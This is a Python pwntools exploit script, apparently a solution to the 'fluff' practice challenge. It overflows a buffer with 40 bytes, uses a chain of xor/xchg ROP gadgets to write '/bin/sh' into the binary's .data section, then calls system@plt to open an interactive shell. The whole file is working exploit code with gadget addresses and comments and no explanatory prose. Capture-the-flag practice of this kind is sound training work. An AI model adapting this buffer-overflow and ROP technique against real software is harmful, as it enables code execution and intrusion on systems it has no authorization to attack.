from pwn import * 

"""
[Sections]
Nm Paddr       Size Vaddr      Memsz Perms Name
00 0x00000000     0 0x00000000     0 ---- 
01 0x00000238    28 0x00400238    28 -r-- .interp
02 0x00000254    32 0x00400254    32 -r-- .note.ABI_tag
03 0x00000274    36 0x00400274    36 -r-- .note.gnu.build_id
04 0x00000298    48 0x00400298    48 -r-- .gnu.hash
05 0x000002c8   288 0x004002c8   288 -r-- .dynsym
06 0x000003e8   116 0x004003e8   116 -r-- .dynstr
07 0x0000045c    24 0x0040045c    24 -r-- .gnu.version
08 0x00000478    32 0x00400478    32 -r-- .gnu.version_r
09 0x00000498    96 0x00400498    96 -r-- .rela.dyn
10 0x000004f8   168 0x004004f8   168 -r-- .rela.plt
11 0x000005a0    26 0x004005a0    26 -r-x .init
12 0x000005c0   128 0x004005c0   128 -r-x .plt
13 0x00000640     8 0x00400640     8 -r-x .plt.got
14 0x00000650   642 0x00400650   642 -r-x .text
15 0x000008d4     9 0x004008d4     9 -r-x .fini
16 0x000008e0   131 0x004008e0   131 -r-- .rodata
17 0x00000964    68 0x00400964    68 -r-- .eh_frame_hdr
18 0x000009a8   308 0x004009a8   308 -r-- .eh_frame
19 0x00000e10     8 0x00600e10     8 -rw- .init_array
20 0x00000e18     8 0x00600e18     8 -rw- .fini_array
21 0x00000e20     8 0x00600e20     8 -rw- .jcr
22 0x00000e28   464 0x00600e28   464 -rw- .dynamic
23 0x00000ff8     8 0x00600ff8     8 -rw- .got
24 0x00001000    80 0x00601000    80 -rw- .got.plt
25 0x00001050    16 0x00601050    16 -rw- .data
26 0x00001060     0 0x00601060    48 -rw- .bss
27 0x00001060    52 0x00000000    52 ---- .comment
28 0x00001ae6   268 0x00000000   268 ---- .shstrtab
29 0x00001098  1896 0x00000000  1896 ---- .symtab
30 0x00001800   742 0x00000000   742 ---- .strtab
"""

def write(address, data):

	# Place address in r10
	chain = p64(0x400822) # : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret [r11 = 0]
	chain += "AAAAAAAA" # [r14 = 0x4141414141414141]
	chain += p64(0x400832) # pop r12 ; mov r13d, 0x604060 ; ret
	chain += address # [r12 = address]
	chain += p64(0x40082f) # xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret [r11 = address, r12 = address]
	chain += "BBBBBBBB" # [r12 = 0x4242424242424242]
	chain += p64(0x400840) # xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret [r10 = address]
	chain += "CCCCCCCC" # [r15 = 0x4343434343434343]

	# Place data in r11
	chain += p64(0x400822) # : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret [r11 = 0]
	chain += "DDDDDDDD" # [r14 = 0x4444444444444444]
	chain += p64(0x400832) # pop r12 ; mov r13d, 0x604060 ; ret
	chain += data # [r12 = data]
	chain += p64(0x40082f) # xor r11,r12 ; pop r12 ; mov r13d,0x604060 ; ret [r11 = data]
	chain += "EEEEEEEE" # [r12 = 0x4545454545454545]

	# Write to address
	chain += p64(0x40084c) # pop r15 ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
	chain += "FFFFFFFF" # [r15 = 0x4646464646464646]
	chain += "GGGGGGGG" # [r13 = 0x4747474747474747]
	chain += p64(0) # [r12 = 0] do not xor byte in [r10]

	return chain

def exploit():

	p = process('./fluff')
	#p = gdb.debug('./fluff', 'b *0x40084c')
	context(os='linux', arch='amd64')
	#context.log_level = 'DEBUG'

	log.success("Sending Exploit")

	write_address = p64(0x0601050) # 0x00601050    16 -rw- .data
	exec_string = "/bin/sh\x00"
	system = p64(0x4005e0) # system@plt # write location already in RDI

	pwn = "A" * 40 # overflow
	pwn += write(write_address, exec_string)
	pwn += system

	p.recvuntil(">")
	p.sendline(pwn)
	p.interactive()

exploit()